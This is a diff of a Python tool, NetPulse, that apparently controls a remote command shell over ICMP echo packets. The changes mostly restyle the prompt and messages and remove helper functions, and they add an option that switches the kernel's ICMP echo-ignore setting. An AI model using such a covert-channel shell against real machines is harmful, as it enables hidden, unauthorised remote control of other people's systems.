@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import os
 import sys
 import socket
@@ -12,7 +13,7 @@ __version__ = "0.0.1"
 
 # Inicializando váriaveis globais
 # com valores padrão
-shell = "~>"
+shell = " \033[1;92m%target ❯\033[0m  "
 payload = [0]
 args = None
 message = ""
@@ -24,16 +25,10 @@ event = threading.Event()
 
 
 def f_padding(padding: str, code: int) -> str:
-    """Formata o padding usado nos pacotes ICMP.
+    """
+    Formata o padding usado nos pacotes ICMP.
     A função repete ou reduzi a string `padding` para ficar
     com a quantidade de caracteres exato de `code`.
-
-    Args:
-        padding (str): string para formatação
-        code (int): quantidade de caracteres
-
-    Returns:
-        str: `padding` com a formatação
     """
     # verifica se code é maior ou igual a
     # padding para então aumentar ou manter
@@ -48,14 +43,9 @@ def f_padding(padding: str, code: int) -> str:
 
 
 def process_command(bytes: str) -> str:
-    """Solicita o envio do comando e obtem a saída,
+    """
+    Solicita o envio do comando e obtem a saída,
     além de fazer verificações de checksum.
-
-    Args:
-        bytes (str): os bytes a serem enviado para o alvo
-
-    Returns:
-        str: a saída do comando retornada pelo alvo
     """
     global payload
     global payload_index
@@ -120,14 +110,17 @@ def process_command(bytes: str) -> str:
                 # se zero, simboliza que o alvo ainda não enviou
                 # um ICMP request para inicializar a troca de dados
                 if p == 0:
-                    print("\r+ Aguardando requisição do alvo...", end="")
+                    print("\r* Waiting for a target request...", end="")
                 else:
                     print(
-                        f"\r+ Enviando dados... ({payload_index}/{payload_len}) {p}%",
+                        f"\r* Sending bytes to the target... ({payload_index}/{payload_len}) {p}%",
                         end="",
                     )
             else:
-                print(f"\r+ Recebendo dados... {len(message)} bytes         ", end="")
+                print(
+                    f"              \r* Receiving data from the target... {len(message)} bytes",
+                    end="",
+                )
         except KeyboardInterrupt:
             # caso aconteça uma interrupção de teclado
             # o recebido de dados acaba
@@ -136,7 +129,7 @@ def process_command(bytes: str) -> str:
             listening = False
             return message
 
-    print(f"\r{' ' * 40}\r", end="")
+    print(f"\r{' '*50}\r", end="")
 
     message = message.split(":")
 
@@ -149,8 +142,9 @@ def process_command(bytes: str) -> str:
         content_hash = hashlib.sha1(content.encode(args.decode)).hexdigest()
         if content_hash != checksum:
             # imprime um erro caso a verificação checksum falhe
-            print_error(
-                "[NetPulse Message] SHA1 integrity check failed. The command output is likely to be corrupted."
+            print(
+                "\033[1;91m[NETPULSE MESSAGE] SHA1 checksum failed, indicating potential corruption in the command output.\033[0m",
+                file=sys.stderr,
             )
     message = ""
 
@@ -158,11 +152,9 @@ def process_command(bytes: str) -> str:
 
 
 def connection(packet: Packet) -> None:
-    """Função chamada pela função `sniff` toda vez que
+    """
+    Função chamada pela função `sniff` toda vez que
     um pacote ICMP echo request é enviado a máquina.
-
-    Args:
-        packet (Packet): pacote que foi capturado pela função de farejamento
     """
     global payload_index
     global listening
@@ -227,11 +219,7 @@ def connection(packet: Packet) -> None:
 
 
 def create_main_parser() -> argparse.ArgumentParser:
-    """Cria um parser de argumentos padrão para o programa.
-
-    Returns:
-        argparse.ArgumentParser: o analisador de argumentos formatado
-    """
+    """Cria um parser de argumentos padrão para o programa."""
     parser = argparse.ArgumentParser(
         prog="netpulse",
         add_help=False,
@@ -297,39 +285,26 @@ NetPulse v{__version__} - github.com/thekh49s/netpulse
         "-c",
         dest="command",
         metavar="<command>",
-        help="execute <command> and exit the program. DO NOT USE THIS OPTION TO ESTABLISH A CONNECTION.",
+        help="execute <command> and exit the program. (DO NOT USE THIS OPTION TO ESTABLISH A CONNECTION)",
+    )
+    options.add_argument(
+        "-s",
+        dest="kernel_cfg",
+        action="store_true",
+        help="set/unset the kernel to ignore ICMP packets.",
     )
 
     parser.add_argument(
         "target",
+        nargs="?",
         help=argparse.SUPPRESS,
     )
 
     return parser
 
 
-def print_warn(message: str, **kwargs) -> None:
-    print("\033[93m:: [#] {}\033[0m".format(message), **kwargs)
-
-
-def print_error(message: str, **kwargs) -> None:
-    print("\033[91m:: [!] {}\033[0m".format(message), **kwargs)
-
-
-def print_info(message: str, **kwargs) -> None:
-    print("\033[94m:: [-] {}\033[0m".format(message), **kwargs)
-
-
-def print_success(message: str, **kwargs) -> None:
-    print("\033[92m:: [+] {}\033[0m".format(message), **kwargs)
-
-
 def _sniff(event: threading.Event) -> None:
-    """Responsavél por chamar a função `sniff` e tratar erros.
-
-    Args:
-        event (threading.Event)
-    """
+    """Responsavél por chamar a função `sniff` e tratar erros."""
     global args
 
     try:
@@ -344,35 +319,72 @@ def _sniff(event: threading.Event) -> None:
         # caso aconteça um erro de permissão negada
         # imprime uma mensagem e tenta parar o evento
         event.is_set()
-        print_error("Você não tem permissão necessária para executar o comando.")
+        print("[ERROR] Insufficient permissions. Try as root!")
+        return
+
+
+def kernel_configure() -> int:
+    """Set/Unset the kernel to ignore ICMP packets."""
+    filenames = [
+        "/proc/sys/net/ipv4/icmp_echo_ignore_all",
+        "/proc/sys/net/ipv6/icmp/icmp6_echo_ignore_all",
+    ]
+    for filename in filenames:
+        print(f"[-] Reading file {filename}...")
+        try:
+            with open(filename, "r") as fp:
+                file_value = fp.read().strip()
+                if file_value == "0":
+                    print("[+] Setting file value to 1.")
+                    with open(filename, "w") as fp:
+                        fp.write("1")
+                    print("[-] System will now ignore all ICMP packets from this configuration.")
+                elif file_value == "1":
+                    print("[+] Setting file value to 0.")
+                    with open(filename, "w") as fp:
+                        print("[-] System will stop ignoring all ICMP packets from this configuration.")
+                        fp.write("0")
+                else:
+                    print(f"[!] Value of the file is unrecognizable: {file_value}")
+        except FileNotFoundError:
+            print("[!] File was not found.")
+        except PermissionError:
+            print("[!] Insufficient permissions.")
+    return 0
 
 
 def main() -> int:
-    """Função principal do programa.
-
-    Returns:
-        int: código de saída.
-    """
+    """Função principal do programa."""
     global establish
     global event
     global args
     global shell
 
     # pega os argumentos do analisador
-    args = create_main_parser().parse_args()
+    parser = create_main_parser()
+    args = parser.parse_args()
+
+    if args.kernel_cfg:
+        return kernel_configure()
+
+    if args.target is None:
+        parser.print_usage()
+        print(
+            "netpulse: error: the following arguments are required: target",
+            file=sys.stderr,
+        )
+        return 1
 
     try:
         # verifica se o endereço fornecido é válido
         # e faz tradução DNS
         target = socket.gethostbyname(args.target)
     except socket.gaierror:
-        print_error(f"Verifique se o alvo ({args.target}) está correto.")
+        print(f"[ERROR] Please verify that the target ({args.target}) is correct.")
         return 1
 
     # cria o thread para o sniffer
     sniff_thread = threading.Thread(target=_sniff, args=(event,))
-
-    print_info(f"Ouvindo por pacotes de {target}...")
 
     # inicializa o thread
     sniff_thread.start()
@@ -395,7 +407,7 @@ def main() -> int:
     while True:
         try:
             # input para processar os comandos
-            output = process_command(input(f"\033[0;90m{target} {shell} \033[0;0m"))
+            output = process_command(input(shell.replace("%target", args.target)))
 
             # imprime a saída caso ela tenha um tamanho
             # diferente de zero
@@ -403,8 +415,7 @@ def main() -> int:
                 print(output)
 
         except KeyboardInterrupt:
-            print()
-            print_info("Quitting...")
+            print("\n\033[1;93mQuitting...\033[0m")
 
             # tenta parar o evento do sniffer
             event.set()
